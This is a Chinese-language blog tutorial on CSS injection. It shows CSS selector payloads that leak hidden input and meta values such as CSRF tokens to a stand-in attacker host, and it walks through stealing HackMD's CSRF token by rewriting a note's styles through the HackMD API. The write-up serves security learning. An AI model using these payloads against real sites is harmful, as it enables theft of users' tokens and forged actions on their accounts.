---
title: CSS 衍生的資安問題(上) - 初探 CSS Ingection
---


## 前言

這篇文章主要是因為去 2022 iThome 的資安大會聽 [Huli](https://blog.huli.tw/) 老師講的主題，聽完之後實際去嘗試了用 CSS Injection 去偷 Hackmd 的 CSRF Token 的過程，整個概念十分新穎有趣，有興趣的我們就開始吧~

## 甚麼是 CSS Injection

不知道各位有沒有聽過 **XSS (Cross-Site Scripting)**，XSS 最容易發生的情境在於前端網站將使用者輸入的訊息送到後端，後端再將這些資料原封不動的呈現造成的風險，可能會被嵌入惡意的腳本。

題外話，為甚麼不叫 XSS 不叫 CSS，因為 CSS 已經被用掉了嘛! 說到這裡，有沒有情況是網站讓使用者可以輸入 CSS 定義網頁的樣式呢?

好像不少呢! 不過網頁嵌入自訂義的 CSS 能夠有甚麼風險呢?

## 用 CSS Selector 拿到 Input 的資料

### 小試水溫

我們先試著想想看網頁裡可能會存在甚麼敏感資料呢? 最常見的可能就是 CSRF Token 了吧! 假設有人可以拿到你的 CSRF Token，可能讓你在不知情的情況下被偽造身分， CSRF Token 常常寫在網頁用隱藏表單帶著，這也讓 CSS Ingection 有機可趁! 不知道 CSRF 攻擊的讀者可以看[這篇](https://lidemy5thwbc.coderbridge.io/2021/07/01/information-security/)。

```css
input[value^="a"] {
    background: url(https://yourdomain/a);
}
```

如果網頁寫進了這樣的樣式，代表網頁裡如果有 input 的 value 的第一個字是 a 的話，就會跟駭客的伺服器發送請求。

到這裡聰明的讀者有沒有感覺了呢?

### 實際情況

在比較實際的情況下，CSRF 存放的 input 通常是 `display: hidden` 的，我們用 visual studio 快速生成一個 Html 並開啟 live server 實驗。

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta name="token" content="abc123">
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
    <style>
        input[value^='a'] {
            background: url('https://picsum.photos/200/300')
        }
    </style>
</head>
<body>
    <form>
        <input type="hidden" name="token" value="abc123">
        <input name="action" value="update">
        <input type="submit">
    </form>
</body>
</html>
```

![](https://raw.githubusercontent.com/Wangpoching/blog-backup/main/assets/images/6ca06c6671bc12d2.png)

結果不意外是因為既然不用顯示，瀏覽器也懶得幫你送出請求 XD

-----

但是如果你換了這個 CSS Selector 呢?

```css
input[value^="a"] + input {
    background: url(https://yourdomain/a);
}
```

![](https://raw.githubusercontent.com/Wangpoching/blog-backup/main/assets/images/018f7a04424b51b2.png)

這樣一來駭客真的收到了請求。

-----

讀者可能會想到 `+` selector 的樣式只會作用在後面的元素上，所以把帶有 CSRF Token 的 input 放在表單最後就安全啦!

沒錯，如此一來 `+` selector 的確被廢了手腳，不過今年主流瀏覽器們開始支援 `has:` 這個 CSS 的 Selector 了(笑

```css
form:has(input[value=^="a"]) {
    background: url(https://yourdomain/a);
}
```

has 這個 CSS Selector 代表指定的元素底下只要有符合條件的元素便會被帶上樣式，如此方便的功能簡直是雙面刃呢XD

## 用 CSS Selector 拿到 Meta 的資料

事實上有些情況下網頁會選擇把 CSRF Token 藏在 meta 裡，因為 meta 的資訊並不會直接顯示在畫面上，十分合理。接著來練習偷 Meta 的資料吧!

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta name="token" content="abc123">
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="token" content="abc">
    <title>Document</title>
    <style>
        meta[content^='a'] {
            background: url('https://picsum.photos/200/300')
        }
    </style>
</head>
<body>
    <div>CSS Injection Demo</div>
</body>
</html>
```

```css
        meta[content^='a'] {
            background: url('https://picsum.photos/200/300')
        }
```

這樣的寫法讀這覺得可行嗎?

![](https://raw.githubusercontent.com/Wangpoching/blog-backup/main/assets/images/1d83b2b4d7076b50.png)

因為瀏覽器預設 meta 是 `display: none;`，所以是沒有用的噢! 那麼把 CSS 改寫成:

```css
        meta {
            display: block;
        }
        meta[content^='a'] {
            background: url('https://picsum.photos/200/300')
        }
```

但瀏覽器仍然沒有發出請求，為甚麼呢? 其實是因為 meta 的父層，head 也是預設 `display: none`，現在把 CSS 改寫成:

```css
        head, meta {
            display: block;
        }
        meta[content^='a'] {
            background: url('https://picsum.photos/200/300')
        }
```

請求成功被送出~~

## 開始玩湊數字遊戲

雖然可以偷到網頁的資料，不過像剛剛的情況光第一個字我們就要猜 26 個大寫字母、26 的小寫字母、10 個數字、加上若干的特殊字元，假設總共有 26 + 26 + 10 + 2 = 64 個可能性，並假設 CSRF Token 有 10 位數，這樣我們要寫 **64 的 10 次方**種 CSS Selector 來窮舉。

但是在特定的情況下，並不用窮舉所有可能，我們可以**一個位數一個位數猜**! 比方說一開始先寫 64 的字元的 CSS Selector，當 match 到某一個字元的時候，server 會收到那個字元，假設這個字元是 `a` 好了，那麼接下來 server 只要有辦法再次修改網頁的 CSS Selector，將他們改成:

```css
        head, meta {
            display: block;
        }
        meta[content^='aa'] {
            background: url('https://yourdomain/aa')
        }
         meta[content^='ab'] {
            background: url('https://yourdomain/ab')
        }
        meta[content^='ac'] {
            background: url('https://yourdomain/ac)
        }...        
```

如此一來第 2 次只要從第一次的 a 再往下匹配 64 種組合，依此類推總共只要 64 x 10 = 640 個 CSS Selector 便可以完成! 整個降維呀!

不過這個方法可行的前提是**網頁支持熱更新**的情況，比如說 websocket，如此才能在使用者沒有任何動作的情況下不停抽換網頁的 CSS。

## 攻擊 Hackmd

### 觀察漏洞

Hackmd 是一個主流的筆記網站，對自訂樣式的支援十分直接，編輯者可以直接寫 `<style></style>` 來任意改變網頁樣式。

首先先寫一篇測試的 note。

![](https://raw.githubusercontent.com/Wangpoching/blog-backup/main/assets/images/2c12fa1013441b0a.png)

上面的範例是網路上抄的，並不是筆者 XD

-----

接著按右上角的 Share，觀看模式調成 Edit Mode，為甚麼呢? 因為我發現只有 Edit Mode 產生的網址會及時跟著作者更新文章而更新內容! 這樣才符合上述的**網頁支持熱更新**的情況，其餘模式下都要刷新畫面才會更新內容。

![](https://raw.githubusercontent.com/Wangpoching/blog-backup/main/assets/images/ce74043d5833daaf.png)

-----

最後我們觀察要竊取的目標，將剛剛複製的分享連結用無痕模式打開來模擬受害人，然後我們發現在 meta tag 裡面存有 CSRF Token 呢! Bingo!

![](https://raw.githubusercontent.com/Wangpoching/blog-backup/main/assets/images/f3217b98a855469e.png)

### 準備 Hackmd Note API

既然想要透過程式修改文章的內容，動態插入 CSS Selector，首先要先研究 Hackmd 有沒有提供修改文章的 API。

[API 文件](https://hackmd.io/c/tutorials/https%3A%2F%2Fhackmd.io%2F%40hackmd-api%2Fdeveloper-portal%3Futm_source%3Dtutorial%26utm_medium%3Dbook-section)


-----

首先要取得 Bearer Token。在帳戶-Setting-API 的 createToken 便可以取得。

![](https://raw.githubusercontent.com/Wangpoching/blog-backup/main/assets/images/8796c5e64ff488fb.png)

接著我們找到我們需要的兩支 API - 取得以及修改 note。

![](https://raw.githubusercontent.com/Wangpoching/blog-backup/main/assets/images/81f8d6b494a422a1.png)

![](https://raw.githubusercontent.com/Wangpoching/blog-backup/main/assets/images/cf3dcc91211c6df6.png)

### 將 Note 加上初始的 CSS Selector

我們在 note 的後面加上:

```
<style>
	head, meta {
		display: block;
	}


	meta[name="csrf-token"] {
		background: url('http://localhost:8100/cssinjection/@');
	}
</style>
```

這麼做的目的是讓一開始先讓 server 先收到 `@`，然後便開始動態更新第一輪的 64 個 CSS Selector，因為我很懶不想一開始就先寫 64 個 XDD

### 撰寫腳本

我們必須寫一個 server 來竊取 CSRF Token，底下是 server 的資料夾結構。
```
project
│   csrfToken.txt
│   index.js    
│   package.json
│   package.json.lock
└───controllers
│   │   getCsrfToken.js
└───node_modules
```

最外層的 csrfToken.txt 等等會寫入 CSRF Token，而 index.js 則是 server 的主程式。我們先從主程式開始看。

-----

#### index.js

![](https://raw.githubusercontent.com/Wangpoching/blog-backup/main/assets/images/e458c25393b3fcf1.png)

重點在第 13 ~ 20 行的部分，第一次我們會收到 `@` 的字樣，但這只是一個開始偷 Csrf Token 的信號，所以在這個時候我們會傳入空字串進入 `getCsrfToken` 而且也不會把 @ 寫進 csrfToken.txt。

#### controllers/getCsrfToken.js

![](https://raw.githubusercontent.com/Wangpoching/blog-backup/main/assets/images/0bb83fa4a42522f6.png)

這個檔案主要寫動態新增 CSS Selector 的邏輯，第 18 ~ 30 行是第一次收到空字串為參數的時候，先打 Hackmd 的 GetNote API 取得文章內容。

第 29 到第 45 行將第一次取得的文章內容依據目前偷到的 CsrfToken 再加上 64 種 CSS Selector 組合，這樣一來便可以準備送出修改後的文章了。

第 46 到 第 57 行則是打 Hakmd EditNote API 將新增過 CSS Selector 的 Note 給送出。

-----

### 開始攻擊

在開始攻擊前僅僅需要下 `node index.js` 將 server 開啟，接著將筆記的連結用 Edit Mode 傳給受害者。

讓我們來看看會發生甚麼事。

![](https://raw.githubusercontent.com/Wangpoching/blog-backup/main/assets/images/ded8e8a6a41a8384.gif)

![](https://raw.githubusercontent.com/Wangpoching/blog-backup/main/assets/images/8e0ea3411916e483.png)

成功偷出!

## 後記

### 優化攻擊手法

在竊取 Hackmd 的 Csrf Token 的案例中，有更快速的方法可以湊出 Csrf Token，利用

```css
    input[value$="a"] {
        background: url("https://yourdomain/a")
    }
```

同時也配對字尾的狀況下可以節省大約一半的時間。
























